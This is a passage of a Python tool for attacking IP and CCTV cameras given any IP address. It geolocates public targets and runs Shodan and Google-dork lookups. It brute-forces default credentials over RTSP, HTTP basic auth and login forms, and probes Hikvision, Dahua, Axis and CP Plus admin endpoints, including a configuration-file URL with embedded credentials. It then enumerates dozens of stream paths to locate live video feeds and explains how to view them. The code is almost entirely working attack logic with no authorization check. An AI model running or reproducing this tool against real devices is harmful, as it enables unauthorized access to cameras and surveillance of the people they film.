        print(f"{C}[🎯] RTSP ports are prioritized (most important for CCTV cameras!){W}")
    
    tested_count = [0]  # Track number of credentials tested
    
    def test_http_credentials(protocol, port, path, auth_type, credentials_list):
        """Test HTTP/HTTPS credentials"""
        nonlocal found
        if found:
            return False
        
        if time.time() - start_time > MAX_CREDENTIAL_TEST_TIME:
            return False
            
        url = f"{protocol}://{ip}:{port}{path}"
        for username, password in credentials_list:
            if found or (time.time() - start_time > MAX_CREDENTIAL_TEST_TIME):
                return False
            
            with lock:
                tested_count[0] += 1
                if tested_count[0] % 20 == 0:
                    elapsed = int(time.time() - start_time)
                    print(f"  📊 Tested {tested_count[0]} credentials... ({elapsed}s elapsed)")
            
            try:
                if auth_type == "basic":
                    response = requests.get(url, auth=(username, password), 
                                        headers=HEADERS, timeout=CREDENTIAL_TIMEOUT, verify=False)
                elif auth_type == "form":
                    response = requests.post(url, data={'username': username, 'password': password},
                                            headers=HEADERS, timeout=CREDENTIAL_TIMEOUT, verify=False)
                
                if response.status_code == 200:
                    with lock:
                        if not found:
                            found = True
                            print(f"🔥 Success! {username}:{password} @ {url}")
                    return True
            except requests.exceptions.Timeout:
                continue
            except requests.exceptions.RequestException:
                continue
            except Exception:
                pass
        return False
    
    def test_rtsp_credentials_thread(port, credentials_list):
        """Test RTSP credentials in a thread"""
        nonlocal found
        if found:
            return False
        
        if time.time() - start_time > MAX_CREDENTIAL_TEST_TIME:
            return False
        
        for username, password in credentials_list:
            if found or (time.time() - start_time > MAX_CREDENTIAL_TEST_TIME):
                return False
            
            with lock:
                tested_count[0] += 1
                if tested_count[0] % 20 == 0:
                    elapsed = int(time.time() - start_time)
                    print(f"  📊 Tested {tested_count[0]} credentials... ({elapsed}s elapsed)")
            
            if test_rtsp_credentials(ip, port, username, password):
                with lock:
                    if not found:
                        found = True
                        print(f"🔥 Success! RTSP {username}:{password} @ rtsp://{ip}:{port}/")
                return True
        return False

    # Test endpoints with threading
    threads = []
    max_concurrent = 30
    THREAD_JOIN_TIMEOUT = 5
    
    # PRIORITY 1: Test RTSP ports first (MOST IMPORTANT!)
    for port in sorted(all_rtsp_ports):
        if found or (time.time() - start_time > MAX_CREDENTIAL_TEST_TIME):
            break
        
        # Test RTSP credentials
        thread = threading.Thread(target=test_rtsp_credentials_thread, args=(port, PRIORITY_CREDENTIALS))
        thread.daemon = True
        threads.append(thread)
        thread.start()
        
        if len(threads) >= max_concurrent:
            for t in threads:
                t.join(timeout=THREAD_JOIN_TIMEOUT)
            threads = []
    
    # PRIORITY 2: Test HTTP/HTTPS credentials on web ports
    endpoints = [
        ("/", "basic"),  # Most common - HTTP Basic Auth
        ("/login", "form"),  # Common login form
    ]
    
    for port in web_ports[:10]:
        if found or (time.time() - start_time > MAX_CREDENTIAL_TEST_TIME):
            break
        protocol = get_protocol(port)
        
        for path, auth_type in endpoints:
            if found or (time.time() - start_time > MAX_CREDENTIAL_TEST_TIME):
                break
            
            thread = threading.Thread(target=test_http_credentials, args=(protocol, port, path, auth_type, PRIORITY_CREDENTIALS))
            thread.daemon = True
            threads.append(thread)
            thread.start()
            
            if len(threads) >= max_concurrent:
                for t in threads:
                    t.join(timeout=THREAD_JOIN_TIMEOUT)
                threads = []
    
    # Wait for priority credentials to finish
    for thread in threads:
        thread.join(timeout=THREAD_JOIN_TIMEOUT)
    threads = []
    
    # If not found, test remaining credentials (but only if we have time)
    if not found and (time.time() - start_time < MAX_CREDENTIAL_TEST_TIME * 0.7):
        # Flatten all credentials for remaining tests
        all_credentials = []
        for username, passwords in DEFAULT_CREDENTIALS.items():
            for password in passwords:
                if (username, password) not in PRIORITY_CREDENTIALS:
                    all_credentials.append((username, password))
        
        # Test remaining RTSP credentials
        for port in sorted(all_rtsp_ports)[:3]:  # Only first 3 RTSP ports
            if found or (time.time() - start_time > MAX_CREDENTIAL_TEST_TIME):
                break
            thread = threading.Thread(target=test_rtsp_credentials_thread, args=(port, all_credentials[:30]))
            thread.daemon = True
            threads.append(thread)
            thread.start()
            
            if len(threads) >= max_concurrent:
                for t in threads:
                    t.join(timeout=THREAD_JOIN_TIMEOUT)
                threads = []
        
        # Test remaining HTTP credentials on fewer ports
        for port in web_ports[:3]:
            if found or (time.time() - start_time > MAX_CREDENTIAL_TEST_TIME):
                break
            protocol = get_protocol(port)
            thread = threading.Thread(target=test_http_credentials, args=(protocol, port, "/", "basic", all_credentials[:30]))
            thread.daemon = True
            threads.append(thread)
            thread.start()
            
            if len(threads) >= max_concurrent:
                for t in threads:
                    t.join(timeout=THREAD_JOIN_TIMEOUT)
                threads = []
    
    # Wait for remaining threads
    for thread in threads:
        thread.join(timeout=THREAD_JOIN_TIMEOUT)
    
    elapsed_time = time.time() - start_time
    if elapsed_time >= MAX_CREDENTIAL_TEST_TIME:
        print(f"{Y}[⚠️] Credential testing stopped after {MAX_CREDENTIAL_TEST_TIME}s timeout{W}")
    else:
        print(f"{C}[✓] Tested {tested_count[0]} credentials in {int(elapsed_time)}s{W}")
    
    if not found:
        print("❌ No default credentials found")

def try_default_credentials(ip, port):
    """Attempt to find working credentials for fingerprinting"""
    for username, passwords in DEFAULT_CREDENTIALS.items():
        for password in passwords:
            try:
                response = requests.get(
                    f"http://{ip}:{port}/",
                    auth=(username, password),
                    headers=HEADERS,
                    timeout=TIMEOUT,
                    verify=False
                )
                if response.status_code == 200:
                    return f"{username}:{password}"
            except (requests.exceptions.RequestException, Exception):
                pass
    return None

def search_cve(brand):
    """Enhanced CVE lookup functionality"""
    print(f"\n[🛡️] Checking known CVEs for {brand.capitalize()}:")
    cves = CVE_DATABASE.get(brand.lower())
    if cves:
        for cve in cves:
            print(f"  🔗 https://nvd.nist.gov/vuln/detail/{cve}")
    else:
        print("  ℹ️ No common CVEs found for this brand")

def fingerprint_camera(ip, open_ports):
    print(f"\n[📡] {C}Scanning for Camera Type & Firmware:{W}")
    for port in open_ports:
        protocol = get_protocol(port)
        url_base = f"{protocol}://{ip}:{port}"
        print(f"🔍 Checking {url_base}...")
        try:
            resp = requests.get(url_base, headers=HEADERS, timeout=TIMEOUT, verify=False)
            server_header = resp.headers.get("server", "").lower()
            content = resp.text.lower()
            
            if "hikvision" in server_header:
                print("🔥 Hikvision Camera Detected!")
                fingerprint_hikvision(ip, port)
            elif "dahua" in server_header:
                print("🔥 Dahua Camera Detected!")
                fingerprint_dahua(ip, port)
            elif "axis" in server_header:
                print("🔥 Axis Camera Detected!")
                fingerprint_axis(ip, port)
            elif any(x in content for x in ['cp plus', 'cp-plus', 'cpplus', 'cp_plus', 'uvr', '0401e1']):
                print("🔥 CP Plus Camera Detected!")
                fingerprint_cp_plus(ip, port)
            else:
                print("❓ Unknown Camera Type")
                fingerprint_generic(ip, port)
        except (requests.exceptions.RequestException, Exception):
            print("❌ No response")

def fingerprint_hikvision(ip, port):
    print("➡️  Attempting Hikvision Fingerprint...")
    protocol = get_protocol(port)
    credentials = try_default_credentials(ip, port) or "admin:1234"
    auth_b64 = base64.b64encode(credentials.encode()).decode()
    
    endpoints = [
        f"{protocol}://{ip}:{port}/System/configurationFile?auth={auth_b64}",
        f"{protocol}://{ip}:{port}/ISAPI/System/deviceInfo"
    ]
    
    for url in endpoints:
        try:
            resp = requests.get(url, headers=HEADERS, timeout=TIMEOUT, verify=False)
            if resp.status_code == 401:
                print(f"⚠️ Authentication failed for {url}")
                continue
            if resp.status_code == 200:
                print(f"✅ Found at {url}")
                if "configurationFile" in url:
                    try:
                        xml_root = ET.fromstring(resp.text)
                        model = xml_root.findtext(".//model")
                        firmware = xml_root.findtext(".//firmwareVersion")
                        if model:
                            print(f"📸 Model: {model}")
                        if firmware:
                            print(f"🛡️ Firmware: {firmware}")
                    except ET.ParseError:
                        print("⚠️ Cannot parse XML configuration")
                else:
                    print(resp.text)
        except Exception as e:
            print(f"⚠️ {e}")
    search_cve("hikvision")

def fingerprint_dahua(ip, port):
    print("➡️  Attempting Dahua Fingerprint...")
    protocol = get_protocol(port)
    try:
        url = f"{protocol}://{ip}:{port}/cgi-bin/magicBox.cgi?action=getSystemInfo"
        resp = requests.get(url, headers=HEADERS, timeout=TIMEOUT, verify=False)
        if resp.status_code == 200:
            print(f"✅ Found at {url}")
            print(resp.text.strip())
        else:
            print(f"❌ {url} -> HTTP {resp.status_code}")
    except Exception as e:
        print(f"⚠️ {e}")
    search_cve("dahua")

def fingerprint_axis(ip, port):
    print("➡️  Attempting Axis Fingerprint...")
    protocol = get_protocol(port)
    try:
        url = f"{protocol}://{ip}:{port}/axis-cgi/admin/param.cgi?action=list"
        resp = requests.get(url, headers=HEADERS, timeout=TIMEOUT, verify=False)
        if resp.status_code == 200:
            print(f"✅ Found at {url}")
            for line in resp.text.splitlines():
                if any(x in line for x in ["root.Brand", "root.Model", "root.Firmware"]):
                    print(f"🔹 {line.strip()}")
        else:
            print(f"❌ {url} -> HTTP {resp.status_code}")
    except Exception as e:
        print(f"⚠️ {e}")
    search_cve("axis")

def fingerprint_cp_plus(ip, port):
    print("➡️  Attempting CP Plus Fingerprint...")
    protocol = get_protocol(port)
    
    # CP Plus specific endpoints
    endpoints = [
        f"{protocol}://{ip}:{port}/",
        f"{protocol}://{ip}:{port}/index.html",
        f"{protocol}://{ip}:{port}/login",
        f"{protocol}://{ip}:{port}/admin",
        f"{protocol}://{ip}:{port}/cgi-bin",
        f"{protocol}://{ip}:{port}/api",
        f"{protocol}://{ip}:{port}/config"
    ]
    
    for url in endpoints:
        try:
            resp = requests.get(url, headers=HEADERS, timeout=TIMEOUT, verify=False)
            if resp.status_code == 200:
                print(f"✅ Found at {url}")
                content = resp.text.lower()
                
                # Look for CP Plus specific information
                if 'uvr-0401e1' in content or 'uvr0401e1' in content:
                    print(f"📸 Model: CP-UVR-0401E1-IC2")
                if 'cp plus' in content or 'cpplus' in content:
                    print(f"🏢 Brand: CP Plus")
                if 'dvr' in content:
                    print(f"📺 Device Type: DVR")
                
                # Print first 500 characters for analysis
                print(f"📄 Response Preview: {resp.text[:500]}")
                break
        except Exception as e:
            print(f"⚠️ {e}")
    
    search_cve("cp plus")

def fingerprint_generic(ip, port):
    print("➡️  Attempting Generic Fingerprint...")
    protocol = get_protocol(port)
    endpoints = [
        "/System/configurationFile",
        "/ISAPI/System/deviceInfo",
        "/cgi-bin/magicBox.cgi?action=getSystemInfo",
        "/axis-cgi/admin/param.cgi?action=list",
        "/",
        "/index.html",
        "/login",
        "/admin",
        "/cgi-bin",
        "/api",
        "/config"
    ]
    brand_keywords = {
        "hikvision": ["hikvision"],
        "dahua": ["dahua"],
        "axis": ["axis"],
        "cp plus": ["cp plus", "cp-plus", "cpplus", "cp_plus", "uvr", "0401e1"],
    }
    detected_brand = None
    for path in endpoints:
        url = f"{protocol}://{ip}:{port}{path}"
        try:
            resp = requests.get(url, headers=HEADERS, timeout=TIMEOUT, verify=False)
            if resp.status_code == 200:
                print(f"✅ Found at {url}")
                snippet = resp.text[:500]
                print(snippet)
                # Try to detect brand in response text or headers
                text = (resp.text + " " + str(resp.headers)).lower()
                for brand, keywords in brand_keywords.items():
                    if any(keyword in text for keyword in keywords):
                        detected_brand = brand
                        break
                if detected_brand:
                    search_cve(detected_brand)
                    break  # Continue checking other endpoints
        except (requests.exceptions.RequestException, Exception):
            pass
    if not detected_brand:
        print("❌ No common endpoints responded.")

def check_stream(url):
    """Enhanced stream detection with multiple methods"""
    try:
        # Method 1: Try HEAD request first
        response = requests.head(url, timeout=TIMEOUT, verify=False)
        if response.status_code == 200:
            # Check content type for video/stream indicators
            content_type = response.headers.get('Content-Type', '').lower()
            if any(x in content_type for x in ['video', 'stream', 'mpeg', 'h264', 'mjpeg', 'rtsp', 'rtmp']):
                return True
            # Check for common video file extensions in URL
            if any(x in url.lower() for x in ['.mp4', '.m3u8', '.ts', '.flv', '.webm']):
                return True
            # Check for streaming protocols in URL
            if any(x in url.lower() for x in ['rtsp://', 'rtmp://', 'mms://']):
                return True
        
        # Method 2: Try GET request for better detection
        response = requests.get(url, timeout=TIMEOUT, verify=False, stream=True)
        if response.status_code == 200:
            # Check content type
            content_type = response.headers.get('Content-Type', '').lower()
            if any(x in content_type for x in ['video', 'stream', 'mpeg', 'h264', 'mjpeg', 'rtsp', 'rtmp', 'image']):
                return True
            
            # Check for video file extensions in URL
            if any(x in url.lower() for x in ['.mp4', '.m3u8', '.ts', '.flv', '.webm', '.avi', '.mov']):
                return True
            
            # Check for streaming protocols in URL
            if any(x in url.lower() for x in ['rtsp://', 'rtmp://', 'mms://', 'rtp://']):
                return True
            
            # Check response content for stream indicators
            try:
                content = response.text.lower()
                if any(x in content for x in ['stream', 'video', 'live', 'camera', 'mjpg', 'mpeg']):
                    return True
            except (UnicodeDecodeError, AttributeError):
                pass
        
        # Method 3: Check for specific camera stream patterns
        if any(x in url.lower() for x in ['/video', '/stream', '/live', '/mjpg', '/snapshot']):
            return True
            
    except requests.exceptions.RequestException:
        pass
    except Exception as e:
        pass
    return False

def detect_camera_brand(ip, open_ports):
    """Detect camera brand from HTTP responses"""
    detected_brands = set()
    
    # Brand indicators in URLs, content, or headers
    brand_indicators = {
        'axis': ['/view/index.shtml', '/axis-cgi/', 'axis', 'axis communications'],
        'hikvision': ['hikvision', '/ISAPI/', '/Streaming/'],
        'dahua': ['dahua', '/cgi-bin/magicBox.cgi'],
        'sony': ['sony', 'ipela'],
        'panasonic': ['panasonic', 'network camera'],
    }
    
    for port in open_ports[:5]:  # Check first 5 ports
        try:
            protocol = get_protocol(port)
            url = f"{protocol}://{ip}:{port}/"
            response = requests.get(url, headers=HEADERS, timeout=2, verify=False)
            
            if response.status_code == 200:
                content = response.text.lower()
                url_lower = url.lower()
                
                # Check for brand indicators
                for brand, indicators in brand_indicators.items():
                    if any(ind in content or ind in url_lower for ind in indicators):
                        detected_brands.add(brand)
        except (requests.exceptions.RequestException, Exception):
            continue
    
    return detected_brands

def detect_live_streams(ip, open_ports, rtsp_ports=None):
    """Enhanced live stream detection with better methods"""
    print(f"\n{C}[🎥] Checking for Live Streams:{W}")
    found_streams = False
    
    if rtsp_ports is None:
        rtsp_ports = []
    
    # Detect camera brands that might support RTSP
    detected_brands = detect_camera_brand(ip, open_ports)
    
    # Common streaming protocols and their default ports
    streaming_ports = {
        'rtsp': [554, 8554, 10554],  # Multiple RTSP ports
        'rtmp': [1935, 1936],
        'http': [80, 8080, 8000, 8001],
        'https': [443, 8443, 8444],
        'mms': [1755],
        'onvif': [3702, 80, 443],  # ONVIF discovery and streaming
        'vlc': [8080, 8090]  # VLC streaming ports
    }
    
    # FIRST: Show RTSP links for RTSP ports (detected + standard RTSP ports that are open)
    # Combine detected RTSP ports with standard RTSP ports that are open
    all_rtsp_ports = set(rtsp_ports) | set([p for p in open_ports if p in streaming_ports['rtsp']])
    
    # ALSO: For known camera brands that support RTSP, suggest RTSP URLs even if not detected
    # Brands that commonly support RTSP: Axis, Hikvision, Dahua, Sony, Panasonic
    rtsp_supporting_brands = {'axis', 'hikvision', 'dahua', 'sony', 'panasonic'}
    if detected_brands & rtsp_supporting_brands and not all_rtsp_ports:
        # Camera brand detected but no RTSP ports found - suggest RTSP on common ports
        suggested_rtsp_ports = [554]  # Standard RTSP port
        # Also suggest RTSP on HTTP ports if it's a known brand
        for port in open_ports:
            if port in [80, 443, 8000, 8080] and port not in all_rtsp_ports:
                suggested_rtsp_ports.append(port)
        
        all_rtsp_ports = all_rtsp_ports | set(suggested_rtsp_ports)
        if suggested_rtsp_ports:
            brand_names = ', '.join([b.capitalize() for b in detected_brands & rtsp_supporting_brands])
            print(f"\n{C}[🎯] {brand_names} Camera Detected - Suggesting RTSP URLs (RTSP may be available):{W}")
    
    if all_rtsp_ports:
        found_streams = True  # Mark streams as found if RTSP ports detected
        # Only show "RTSP Ports Found" header if not already shown for brand detection
        if not (detected_brands & rtsp_supporting_brands and not rtsp_ports):
            print(f"\n{C}[🎯] RTSP Ports Found - Potential RTSP URLs:{W}")
        rtsp_ports_sorted = sorted(all_rtsp_ports)
        for port in rtsp_ports_sorted:
            # Show common RTSP paths
            common_paths = ['/', '/live.sdp', '/h264.sdp', '/stream1', '/Streaming/Channels/1']
            # Brand-specific paths
            if 'axis' in detected_brands:
                common_paths.extend(['/axis-media/media.amp', '/axis-media/media.amp?camera=1'])
            if 'hikvision' in detected_brands:
                common_paths.extend(['/Streaming/Channels/101', '/Streaming/Channels/1'])
            
            for path in common_paths[:5]:  # Limit to 5 paths per port
                rtsp_url = f"rtsp://{ip}:{port}{path}"
                print(f"  🎥 RTSP: {rtsp_url}")
            print(f"     🎯 Use VLC (Media -> Open Network Stream) to test these RTSP URLs")
        print()  # Empty line for readability
    
    # Enhanced stream paths for different camera brands
    stream_paths = {
        'rtsp': [
            # Generic paths
            '/live.sdp',
            '/h264.sdp',
            '/stream1',
            '/stream2',
            '/main',
            '/sub',
            '/video',
            '/cam/realmonitor',
            '/Streaming/Channels/1',
            '/Streaming/Channels/101',
            # Brand-specific paths
            '/onvif/streaming/channels/1',  # ONVIF
            '/axis-media/media.amp',  # Axis
            '/axis-cgi/mjpg/video.cgi',  # Axis
            '/cgi-bin/mjpg/video.cgi',  # Generic
            '/cgi-bin/hi3510/snap.cgi',  # Hikvision
            '/cgi-bin/snapshot.cgi',  # Generic
            '/cgi-bin/viewer/video.jpg',  # Generic
            '/img/snapshot.cgi',  # Generic
            '/snapshot.jpg',  # Generic
            '/video/mjpg.cgi',  # Generic
            '/video.cgi',  # Generic
            '/videostream.cgi',  # Generic
            '/mjpg/video.mjpg',  # Generic
            '/mjpg.cgi',  # Generic
            '/stream.cgi',  # Generic
            '/live.cgi',  # Generic
            '/live/0/onvif.sdp',  # ONVIF
            '/live/0/h264.sdp',  # Generic
            '/live/0/mpeg4.sdp',  # Generic
            '/live/0/audio.sdp',  # Generic
            '/live/1/onvif.sdp',  # ONVIF
            '/live/1/h264.sdp',  # Generic
            '/live/1/mpeg4.sdp',  # Generic
            '/live/1/audio.sdp'  # Generic
        ],
        'rtmp': [
            '/live',
            '/stream',
            '/hls',
            '/flv',
            '/rtmp',
            '/live/stream',
            '/live/stream1',
            '/live/stream2',
            '/live/main',
            '/live/sub',
            '/live/video',
            '/live/audio',
            '/live/av',
            '/live/rtmp',
            '/live/rtmps'
        ],
        'http': [
            # Generic paths
            '/video',
            '/stream',
            '/mjpg/video.mjpg',
            '/cgi-bin/mjpg/video.cgi',
            '/axis-cgi/mjpg/video.cgi',
            '/cgi-bin/viewer/video.jpg',
            '/snapshot.jpg',
            '/img/snapshot.cgi',
            # Brand-specific paths
            '/onvif/device_service',  # ONVIF
            '/onvif/streaming',  # ONVIF
            '/axis-cgi/com/ptz.cgi',  # Axis
            '/axis-cgi/param.cgi',  # Axis
            '/cgi-bin/snapshot.cgi',  # Generic
            '/cgi-bin/hi3510/snap.cgi',  # Hikvision
            '/cgi-bin/viewer/video.jpg',  # Generic
            '/img/snapshot.cgi',  # Generic
            '/snapshot.jpg',  # Generic
            '/video/mjpg.cgi',  # Generic
            '/video.cgi',  # Generic
            '/videostream.cgi',  # Generic
            '/mjpg/video.mjpg',  # Generic
            '/mjpg.cgi',  # Generic
            '/stream.cgi',  # Generic
            '/live.cgi',  # Generic
            # Additional paths
            '/api/video',  # API endpoints
            '/api/stream',
            '/api/live',
            '/api/video/live',
            '/api/stream/live',
            '/api/camera/live',
            '/api/camera/stream',
            '/api/camera/video',
            '/api/camera/snapshot',
            '/api/camera/image',
            '/api/camera/feed',
            '/api/camera/feed/live',
            '/api/camera/feed/stream',
            '/api/camera/feed/video',
            # CP Plus specific paths
            '/cgi-bin/snapshot.cgi',
            '/cgi-bin/video.cgi',
            '/cgi-bin/stream.cgi',
            '/cgi-bin/live.cgi'
        ]
    }
    
    def check_stream_with_details(url):
        """Check stream and provide detailed information"""
        try:
            response = requests.get(url, timeout=TIMEOUT, verify=False, stream=True)
            if response.status_code == 200:
                content_type = response.headers.get('Content-Type', '').lower()
                content_length = response.headers.get('Content-Length', '0')
                
                # Check if it's actually a stream/video
                is_rtsp_rtmp_mms = any(x in url.lower() for x in ['rtsp://', 'rtmp://', 'mms://', 'rtp://'])
                is_http_https = url.lower().startswith('http://') or url.lower().startswith('https://')
                
                # Check content type for video/stream indicators (including multipart streams)
                is_stream_content = any(x in content_type for x in ['video', 'stream', 'mpeg', 'h264', 'mjpeg', 'image', 'multipart'])
                
                if is_stream_content:
                    print(f"  ✅ Stream Found: {url}")
                    print(f"     📺 Content-Type: {content_type}")
                    print(f"     📏 Content-Length: {content_length}")
                    # Only suggest VLC for RTSP/RTMP/MMS streams
                    if is_rtsp_rtmp_mms:
                        print(f"     🎯 RTSP/RTMP Stream - Use VLC (Media -> Open Network Stream): {url}")
                    elif is_http_https:
                        print(f"     🌐 HTTP/HTTPS Stream - Open in browser: {url}")
                    return True
                elif any(x in url.lower() for x in ['.mp4', '.m3u8', '.ts', '.flv', '.webm', '.avi', '.mov']):
                    print(f"  ✅ Video File: {url}")
                    print(f"     📺 Content-Type: {content_type}")
                    if is_rtsp_rtmp_mms:
                        print(f"     🎯 RTSP/RTMP Stream - Use VLC (Media -> Open Network Stream): {url}")
                    elif is_http_https:
                        print(f"     🌐 HTTP/HTTPS Video - Open in browser: {url}")
                    return True
                elif is_rtsp_rtmp_mms:
                    print(f"  ✅ Streaming URL: {url}")
                    print(f"     🎯 RTSP/RTMP Stream - Use VLC (Media -> Open Network Stream): {url}")
                    return True
                elif any(x in url.lower() for x in ['/video', '/stream', '/live', '/mjpg', '/snapshot']):
                    print(f"  ✅ Potential Stream: {url}")
                    print(f"     📺 Content-Type: {content_type}")
                    if is_http_https:
                        print(f"     🌐 HTTP/HTTPS Stream - Open in browser: {url}")
                    return True
        except (requests.exceptions.RequestException, Exception):
            pass
        return False
    
    # Check all ports for streams with threading
    threads = []
    max_concurrent = 30
    
    # Check RTSP streams on ALL detected RTSP ports (including non-standard ports)
    rtsp_ports_to_check = set(rtsp_ports) | set(streaming_ports['rtsp'])  # Combine detected RTSP ports with standard ones
    
    for port in open_ports:
        # Check RTSP streams on ALL RTSP-detected ports (not just standard port 554)
        if port in rtsp_ports_to_check:
            for path in stream_paths['rtsp']:
                url = f"rtsp://{ip}:{port}{path}"
                thread = threading.Thread(target=lambda u=url: check_stream_with_details(u) or None)
                thread.daemon = True
                threads.append(thread)
                thread.start()
                found_streams = True
                
                if len(threads) >= max_concurrent:
                    for t in threads:
                        t.join()
                    threads = []
        
        # Check RTMP streams
        if port in streaming_ports['rtmp']:
            for path in stream_paths['rtmp']:
                url = f"rtmp://{ip}:{port}{path}"
                thread = threading.Thread(target=lambda u=url: check_stream_with_details(u) or None)
                thread.daemon = True
                threads.append(thread)
                thread.start()
                found_streams = True
                
                if len(threads) >= max_concurrent:
                    for t in threads:
                        t.join()
                    threads = []
        
        # Check HTTP/HTTPS streams
        if port in streaming_ports['http'] + streaming_ports['https']:
            protocol = 'https' if port in streaming_ports['https'] else 'http'
            for path in stream_paths['http']:
                url = f"{protocol}://{ip}:{port}{path}"
                thread = threading.Thread(target=lambda u=url: check_stream_with_details(u) or None)
                thread.daemon = True
                threads.append(thread)
                thread.start()
                found_streams = True
                
                if len(threads) >= max_concurrent:
                    for t in threads:
                        t.join()
                    threads = []
        
        # Check MMS streams
        if port in streaming_ports['mms']:
            url = f"mms://{ip}:{port}"
            thread = threading.Thread(target=lambda u=url: check_stream_with_details(u) or None)
            thread.daemon = True
            threads.append(thread)
            thread.start()
            found_streams = True
            
            if len(threads) >= max_concurrent:
                for t in threads:
                    t.join()
                threads = []
        
        # Check ONVIF streams
        if port in streaming_ports['onvif']:
            url = f"http://{ip}:{port}/onvif/device_service"
            thread = threading.Thread(target=lambda u=url: check_stream_with_details(u) or None)
            thread.daemon = True
            threads.append(thread)
            thread.start()
            found_streams = True
            
            if len(threads) >= max_concurrent:
                for t in threads:
                    t.join()
                threads = []
    
    # Wait for remaining threads with timeout
    for thread in threads:
        thread.join(timeout=10)  # Add timeout to prevent hanging
    
    # Small delay to ensure all output is flushed
    time.sleep(0.5)
    
    if not found_streams:
        print("  ❌ No live streams detected")
    else:
        print(f"  📊 Stream detection completed")
        if all_rtsp_ports:
            print(f"\n{C}[ℹ️] RTSP Streams Detected - To view RTSP/RTMP streams in VLC:{W}")
            print("    1. Open VLC Media Player")
            print("    2. Go to 'Media' -> 'Open Network Stream'")
            print("    3. Paste the RTSP URL (e.g., rtsp://IP:PORT/) and click 'Play'")
        
        # Always show HTTP/HTTPS message if streams were found
        print(f"\n{C}[ℹ️] HTTP/HTTPS streams can be opened directly in your web browser{W}")
        print(f"     💡 Tip: Look above for HTTP/HTTPS stream URLs (e.g., http://IP:PORT/mjpg/video.mjpg)")

def main():
    global threads_running

    try:
        # Obtener input desde argumento o consola
        if len(sys.argv) > 1:
            user_input = sys.argv[1].strip()
        else:
            user_input = input(
                f"{G}[+] {C}Enter IP address (or IP:PORT): {W}"
            ).strip()
        
        # Parse IP:PORT format
        target_ip, specified_port = parse_ip_port(user_input)
        if target_ip is None:
            return
        
        if not validate_ip(target_ip):
            return
        
        ip_obj = ipaddress.ip_address(target_ip)
        
        # If port is specified, inform user
        if specified_port is not None:
            print(f"{C}[ℹ️] Port {specified_port} specified - will prioritize scanning this port{W}")

        print(BANNER)
        print('____________________________________________________________________________\n')

        # Detect PRIVATE vs PUBLIC
        if ip_obj.is_private:
            print(f"{Y}[🏠] Private Network Detected — Skipping Shodan, IP-Location, and Google Dorking.{W}")
            skip_osint = True
        else:
            skip_osint = False

        # Only run OSINT for PUBLIC IPs
        if not skip_osint:
            print_search_urls(target_ip)
            google_dork_search(target_ip)
            get_ip_location_info(target_ip)
        else:
            print(f"{C}[ℹ️] Proceeding directly to camera scanning...{W}")

        # Begin scanning
        # If specific port provided, include it in the scan (even if not in COMMON_PORTS)
        if specified_port is not None:
            print(f"{C}[ℹ️] Port {specified_port} will be included in the scan{W}")
            open_ports, rtsp_ports = check_ports(target_ip, additional_ports=[specified_port])
        else:
            open_ports, rtsp_ports = check_ports(target_ip)

        if open_ports:
            camera_found = check_if_camera(target_ip, open_ports)

            if not camera_found and not skip_osint:
                choice = input("\n[❓] No camera found. Continue checking login pages, fingerprints, and passwords? [y/N]: ").strip().lower()
                if choice != "y":
                    print("\n[✅] Scan Completed! No camera found.")
                    return

            check_login_pages(target_ip, open_ports)
            fingerprint_camera(target_ip, open_ports)
            test_default_passwords(target_ip, open_ports, rtsp_ports)
            detect_live_streams(target_ip, open_ports, rtsp_ports)

        else:
            print("\n[❌] No open ports found. Likely no camera here.")
        
        print("\n[✅] Scan Completed!")
        
    except KeyboardInterrupt:
        print("\n[!] Scan aborted by user")
        threads_running = False
        sys.exit(1)
        
if __name__ == "__main__":
    main()
